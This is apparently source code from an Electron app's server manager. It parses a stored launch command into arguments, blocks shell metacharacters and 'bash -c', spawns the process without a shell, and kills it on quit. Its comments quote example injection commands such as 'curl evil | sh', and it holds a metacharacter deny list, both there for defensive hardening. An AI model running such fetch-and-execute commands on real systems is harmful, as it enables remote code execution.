  private parseCommandToArgv(command: string): string[] | null {
    // Reject obvious shell metacharacters anywhere outside of double quotes. We scan
    // char-by-char tracking quote state; a metachar seen while NOT inside quotes → reject.
    const META = new Set([';', '|', '&', '$', '`', '>', '<', '(', ')', '\n', '\r', '{', '}', '*', '?', '~', '!', '#', '\\']);
    const argv: string[] = [];
    let cur = '';
    let inQuote = false;
    let sawToken = false;
    for (let i = 0; i < command.length; i++) {
      const c = command[i];
      if (inQuote) {
        if (c === '"') { inQuote = false; }
        else { cur += c; }
        continue;
      }
      if (c === '"') { inQuote = true; sawToken = true; continue; }
      if (c === ' ' || c === '\t') {
        if (sawToken) { argv.push(cur); cur = ''; sawToken = false; }
        continue;
      }
      if (META.has(c)) return null; // metachar outside quotes → unsafe
      cur += c; sawToken = true;
    }
    if (inQuote) return null;          // unterminated quote → malformed
    if (sawToken) argv.push(cur);
    if (!argv.length) return null;
    // CRITICAL — `bash -c "curl evil | sh"` parses cleanly above (all metacharacters
    // are inside quotes) but `bash -c` is itself a shell-execution vector. The parser's
    // metachar scan can't catch it because the shell interprets `-c` as a flag, not a
    // character. Allowlist argv[0] to a known-safe set: the bundled bash launcher,
    // node/python for hypothetical custom launchers. ANY other binary → reject. The
    // bundled auto-spawn path uses `bash <abs path>/hindsight-start.sh` which passes.
    const SAFE_BINARIES = new Set(['bash', 'sh', 'node', 'python', 'python3']);
    const base = (argv[0].split(/[\\/]/).pop() || '').toLowerCase();
    if (!SAFE_BINARIES.has(base)) return null;
    // Also reject `bash -c <command>` and `bash -lc <command>` explicitly — even
    // though bash itself is allowlisted, `-c`/`-lc` allow arbitrary command execution
    // and defeat the argv scan. Reject any argv[1] starting with `-c` or `-l`.
    if (argv[1] && (argv[1] === '-c' || argv[1] === '-lc' || argv[1].startsWith('-c') || argv[1].startsWith('-lc'))) return null;
    return argv;
  }

  private spawnServer(command: string): void {
    try {
      const { spawn } = require('child_process') as typeof import('child_process');
      // SHELL-INJECTION HARDENING — `command` can come from a persisted
      // `hindsightServerCommand` setting (writable by any code that can reach
      // SettingsManager). Running it via `shell: true` would execute embedded
      // metacharacters (`bash x; curl evil | sh`) on every auto-start → RCE on launch.
      // Default: parse into argv and spawn with shell:false (no shell interpretation).
      // Escape hatch: HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL=true restores the legacy
      // shell behavior for power users who genuinely need a shell one-liner.
      const allowShell = String(process.env.HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL || '').toLowerCase() === 'true';
      let argv: string[] | null = null;
      if (!allowShell) {
        argv = this.parseCommandToArgv(command);
        if (!argv) {
          console.error('[HindsightManager] refusing to spawn — command contains shell metacharacters and HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL is not set:', command);
          this.broadcastStatus('spawn-failed', 'launch command rejected (contains shell metacharacters)');
          return;
        }
      }
      this.isAppManaged = true;
      // detached:true on POSIX puts the server in its OWN process group, so on quit we can
      // synchronously kill the WHOLE tree (Python + embedded Postgres workers, which
      // re-parent/daemonize) with one `process.kill(-pid)` inside before-quit — tree-kill
      // is async and the app can exit before it finishes, orphaning Postgres. (Windows has
      // no process groups; we fall back to taskkill /T in stopSync.)
      const isWin = process.platform === 'win32';
      // cwd: prefer the directory CONTAINING scripts/ (the project root) so the launcher's
      // internal relative calls (`node scripts/hindsight-llm-config.mjs`) resolve. The script
      // itself also cd's to its own ../, so this is belt-and-braces; fall back to cwd().
      const script = this.locateLauncherScript();
      let spawnCwd = process.cwd();
      if (script) {
        try {
          const path = require('path') as typeof import('path');
          spawnCwd = path.resolve(path.dirname(script), '..');
        } catch { /* keep process.cwd() */ }
      }
      // Capture the child's stdout+stderr to a log file rather than discarding it (the old
      // stdio:'ignore' made spawn failures invisible — a crash showed only "exited {code:1}"
      // with no reason). On a non-zero exit we tail this file into the app log so the cause
      // (e.g. "No module named 'hindsight'", bad API key) is diagnosable. Best-effort: if the
      // log can't be opened we fall back to 'ignore' so spawning still works.
      this.logPath = this.resolveServerLogPath();
      let outFd: number | null = null;
      try {
        if (this.logPath) {
          const fs = require('fs') as typeof import('fs');
          outFd = fs.openSync(this.logPath, 'a');
        }
      } catch { outFd = null; }
      const stdio: any = outFd !== null ? ['ignore', outFd, outFd] : 'ignore';

      // CLOUD GUARD — when the user is on Hindsight Cloud, skip buildCredentialEnv(): Cloud
      // authenticates with the Hindsight apiKey (already in process.env via HINDSIGHT_API_KEY),
      // not litellm provider keys. Forwarding Gemini/OpenAI/etc. into a Cloud-authenticated
      // process leaks user credentials into a server the user does not own.
      const cfg = this.getHindsightConfig();
      const credsEnv = (cfg && !isLocalTarget(cfg.baseUrl)) ? {} : this.buildCredentialEnv();

      const spawnOpts = {
        detached: !isWin,   // own process group on POSIX for group-kill on quit
        windowsHide: true,
        stdio,
        cwd: spawnCwd,
        // Forward credentials from CredentialsManager into the child's env so the
        // packaged app doesn't need .env or manual GEMINI_API_KEY exports. The shell
        // script (hindsight-start.sh) picks these up and builds the litellm router.
        // augmentPath() fixes the Finder-launch minimal-PATH caveat (python3 not found).
        env: { ...process.env, PATH: this.augmentPath(), ...credsEnv },
      };
      this.serverProcess = allowShell
        // Legacy shell form (opt-in via HINDSIGHT_SERVER_COMMAND_ALLOW_SHELL=true).
        ? spawn(command, { ...spawnOpts, shell: true })
        // Default safe form — argv[0] + args, NO shell interpretation. argv is non-null
        // here (we returned early above if parseCommandToArgv failed).
        : spawn(argv![0], argv!.slice(1), { ...spawnOpts, shell: false });
      // The parent no longer needs the fd once the child owns it.
      if (outFd !== null) { try { require('fs').closeSync(outFd); } catch { /* noop */ } }
      // Don't let the detached child keep the parent event loop alive.
      this.serverProcess.unref?.();
      this.serverProcess.on('error', (err: any) => {
        console.error('[HindsightManager] failed to start server (is it installed?):', err?.message);
        this.isAppManaged = false;
        this.serverProcess = null;
        if (this.pollInterval) { clearInterval(this.pollInterval); this.pollInterval = null; }
        // Surface to the renderer — a top-of-overlay banner will read this and offer "View log".
        this.broadcastStatus('spawn-failed', `failed to start server: ${err?.message || 'unknown error'}`);
      });
      this.serverProcess.on('close', (code: number | null) => {
        console.log('[HindsightManager] server process exited', { code });
        // A non-zero exit before readiness means the launcher failed — surface the tail of its
        // log so the reason is visible in the app log instead of a bare exit code.
        const failed = code !== null && code !== 0;
        if (failed) {
          this.logServerFailureTail();
          // Only surface the broadcast if a spawn was in flight (i.e. we polled for readiness).
          // A user-initiated stopSync() clears isAppManaged BEFORE the close fires, so the
          // conditional prevents a spurious "spawn failed" banner when the user quit normally.
          if (this.isAppManaged) {
            this.broadcastStatus('spawn-failed', `server exited with code ${code}`);
          }
        }
        this.serverProcess = null;
      });
    } catch (e: any) {
      console.error('[HindsightManager] exception spawning server:', e?.message);
      this.isAppManaged = false;
      this.broadcastStatus('spawn-failed', `spawn exception: ${e?.message || 'unknown error'}`);
    }
  }

  /** Poll /health every 5s for up to ~3min (first boot downloads embedding models). */
  private pollUntilReady(): void {
    // Guard against a leaked interval if pollUntilReady is ever entered twice (e.g. a
    // future second start()): clear any prior one before arming a new one.
    if (this.pollInterval) { clearInterval(this.pollInterval); this.pollInterval = null; }
    this.spawnAttempts = 0;
    this.pollInterval = setInterval(async () => {
      // Stop polling immediately if the spawned process has exited (the 'close' handler
      // nulls serverProcess). Before this fix, the loop kept hammering a dead port for
      // the full 180s after a fast-fail spawn (e.g. "No module named 'hindsight'").
      if (!this.serverProcess) {
        if (this.pollInterval) { clearInterval(this.pollInterval); this.pollInterval = null; }
        return;
      }
      this.spawnAttempts++;
      const healthy = await this.healthCheck();
      if (healthy) {
        console.log(`[HindsightManager] server ready after ~${this.spawnAttempts * 5}s`);
        if (this.pollInterval) { clearInterval(this.pollInterval); this.pollInterval = null; }
        this.broadcastStatus('ready');
        return;
      }
      if (this.spawnAttempts >= SPAWN_MAX_ATTEMPTS) {
        console.warn('[HindsightManager] timeout waiting for server — staying Noop. Check the install / command.');
        if (this.pollInterval) { clearInterval(this.pollInterval); this.pollInterval = null; }
        this.logServerFailureTail();
        this.broadcastStatus('unreachable', `server did not respond within ${SPAWN_MAX_ATTEMPTS * SPAWN_POLL_INTERVAL_MS / 1000}s — check the install / command`);
      }
    }, SPAWN_POLL_INTERVAL_MS);
    this.pollInterval.unref?.(); // never keep the process alive for this
  }

  /**
   * SYNCHRONOUS quit hook. Kills the server tree ONLY if WE spawned it (a user-run or
   * Cloud server is left untouched). Must be synchronous: the `before-quit` handler can let
   * the app exit before any async work (tree-kill) completes, orphaning the Python+Postgres
   * tree. Because the server was spawned detached (its own process group on POSIX), one
   * `process.kill(-pid, SIGKILL)` takes down the whole group right now. Never throws.
   */
  stopSync(): void {
    try {
      if (this.pollInterval) { clearInterval(this.pollInterval); this.pollInterval = null; }
      if (!this.isAppManaged || !this.serverProcess?.pid) return;
      const pid = this.serverProcess.pid;
      if (process.platform === 'win32') {
        // No process groups on Windows — taskkill the tree synchronously.
        try {
          require('child_process').execFileSync('taskkill', ['/pid', String(pid), '/T', '/F'], { stdio: 'ignore' });
        } catch { try { process.kill(pid); } catch { /* gone */ } }
      } else {
        // Negative pid → kill the whole process group (server + Postgres workers).
        try { process.kill(-pid, 'SIGKILL'); }
        catch { try { process.kill(pid, 'SIGKILL'); } catch { /* gone */ } }
      }
      this.serverProcess = null;
      this.isAppManaged = false;
      console.log('[HindsightManager] app-managed server tree terminated on quit.');
    } catch (e: any) {
      console.warn('[HindsightManager] stopSync skipped (non-fatal):', e?.message);
    }
  }

  /** Async wrapper kept for API compatibility / non-quit callers. Delegates to stopSync. */
  async stop(): Promise<void> {
    this.stopSync();
  }

  /**
   * Notify the Hindsight layer that an AI provider key was just saved via the AI Providers
   * screen. When an app-managed server is already running, the child inherited the OLD env at
   * spawn time — it won't see the new key until restart. We DON'T auto-restart here
   * (mid-session disruption + first-boot ~3min startup cost); instead we log a clear hint
   * the user can act on, and broadcast a `hindsight-restart-needed` event so the Settings UI
   * can surface a small inline nudge (see IntelligenceSettings.tsx). When no app-managed
   * server is running, this is a no-op — a fresh auto-spawn will pick up the new key
   * naturally. Never throws.
   */
  notifyHindsightOfKeyChange(providerLabel: string): void {
    try {
      if (!this.isAppManaged || !this.serverProcess?.pid) return; // no live app-managed server
      console.warn(
        `[HindsightManager] AI key changed (${providerLabel}) but app-managed Hindsight ` +
        'server is already running — restart it to pick up the new key.'
      );
      try {
        const { BrowserWindow } = require('electron') as typeof import('electron');
        BrowserWindow.getAllWindows().forEach((win) => {
          if (!win.isDestroyed()) {
            win.webContents.send('hindsight-restart-needed', { provider: providerLabel });
          }
        });
      } catch { /* electron unavailable (headless/test) — log-only is enough */ }
    } catch (e: any) {
      console.warn('[HindsightManager] notifyHindsightOfKeyChange skipped (non-fatal):', e?.message);
    }
  }
}
